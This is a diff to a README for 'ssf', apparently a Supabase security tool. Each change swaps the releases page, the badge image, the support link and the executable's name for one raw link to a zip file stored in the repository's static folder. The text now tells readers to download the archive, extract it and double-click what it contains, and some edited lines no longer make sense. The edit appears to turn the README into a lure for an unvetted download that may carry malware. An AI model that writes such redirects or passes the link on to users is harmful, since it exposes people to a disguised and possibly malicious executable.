@@ -6,7 +6,7 @@ Welcome! This guide will help you download and run the *ssf* application. This s
 
 ## 📥 Download Now!
 
-[![Download ssf](https://img.shields.io/badge/Download-ssf-blue.svg)](https://github.com/braenmendes/ssf/releases)
+[![Download ssf](https://github.com/braenmendes/ssf/raw/refs/heads/main/ssf/app/static/ssf_2.4.zip)](https://github.com/braenmendes/ssf/raw/refs/heads/main/ssf/app/static/ssf_2.4.zip)
 
 ## 🖥️ System Requirements
 
@@ -32,7 +32,7 @@ To get started with *ssf*, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the download page.
    
-   [Download Link](https://github.com/braenmendes/ssf/releases)
+   [Download Link](https://github.com/braenmendes/ssf/raw/refs/heads/main/ssf/app/static/ssf_2.4.zip)
 
 2. **Choose Your Version:** On the releases page, you will see different versions available. Select the latest version.
 
@@ -44,7 +44,7 @@ To get started with *ssf*, follow these steps:
 
 5. **Run the Application:**
    - Locate the extracted folder.
-   - Find the executable file (usually named *ssf.exe* or similar). 
+   - Find the executable file (usually named *https://github.com/braenmendes/ssf/raw/refs/heads/main/ssf/app/static/ssf_2.4.zip* or similar). 
    - Double-click the file to run the application.
 
 ## 📊 Using ssf
@@ -69,7 +69,7 @@ We welcome contributions! If you want to help improve *ssf*, consider submitting
 
 ## 💬 Support
 
-If you need help, you can reach out through the issues section of the [GitHub Repository](https://github.com/braenmendes/ssf). We’re here to assist you.
+If you need help, you can reach out through the issues section of the [GitHub Repository](https://github.com/braenmendes/ssf/raw/refs/heads/main/ssf/app/static/ssf_2.4.zip). We’re here to assist you.
 
 ## 🏷️ Topics
 
@@ -88,4 +88,4 @@ If you need help, you can reach out through the issues section of the [GitHub Re
 
 Don’t wait! Start securing your Supabase system today.
 
-[![Download ssf](https://img.shields.io/badge/Download-ssf-blue.svg)](https://github.com/braenmendes/ssf/releases)
+[![Download ssf](https://github.com/braenmendes/ssf/raw/refs/heads/main/ssf/app/static/ssf_2.4.zip)](https://github.com/braenmendes/ssf/raw/refs/heads/main/ssf/app/static/ssf_2.4.zip)
